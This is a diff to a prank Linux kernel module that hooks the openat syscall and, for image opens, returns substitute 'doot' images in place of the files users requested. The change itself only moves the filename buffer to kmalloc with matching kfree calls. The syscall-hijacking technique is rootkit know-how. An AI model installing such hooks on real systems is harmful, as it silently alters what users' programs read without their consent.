@@ -4,6 +4,7 @@
 #include <linux/string.h>
 #include <linux/kallsyms.h>
 #include <linux/printk.h>
+#include <linux/limits.h>
 
 /* openat syscall with distinct lack of doots */
 static sys_call_ptr_t no_doot_open;
@@ -85,39 +86,50 @@ static int to_doot_or_not_to_doot(void)
 static asmlinkage long doot_open(const struct pt_regs *regs)
 {
 	char __user *filename;
-	char name[128];
+	char *name;
 	size_t len;
 
 	filename = (char *) regs->si;
 
 	/* We shouldn't directly use filename */
-	len  = strncpy_from_user(name, filename, sizeof(name));
+	name = kmalloc(PATH_MAX, GFP_KERNEL);
+	if (!name)
+		return -ENOMEM;
+
+	len  = strncpy_from_user(name, filename, PATH_MAX);
 
 	/* Check strncpy_from_user() return value */
-	if (len <= 0)
+	if (len <= 0) {
+		kfree(name);
 		return len;
+	}
 
 	/* Check if dootable and long enough to have an extension */
 	if (to_doot_or_not_to_doot() && strlen(name) >= 3) {
 		if (extcmp(name, ".png") || extcmp(name, ".PNG")) {
 			LOG_DOOT;
 			doots++;
+			kfree(name);
 			return get_fd(doot_png, regs);
 		} else if (extcmp(name, ".svg") || extcmp(name, ".SVG")) {
 			LOG_DOOT;
 			doots++;
+			kfree(name);
 			return get_fd(doot_svg, regs);
 		} else if (extcmp(name, ".jpg") || extcmp(name, ".JPG")) {
 			LOG_DOOT;
 			doots++;
+			kfree(name);
 			return get_fd(doot_jpg, regs);
 		} else if (extcmp(name, ".gif") || extcmp(name, ".GIF")) {
 			LOG_DOOT;
 			doots++;
+			kfree(name);
 			return get_fd(doot_gif, regs);
 		}
 	}
 
+	kfree(name);
 	return no_doot_open(regs);
 }
 
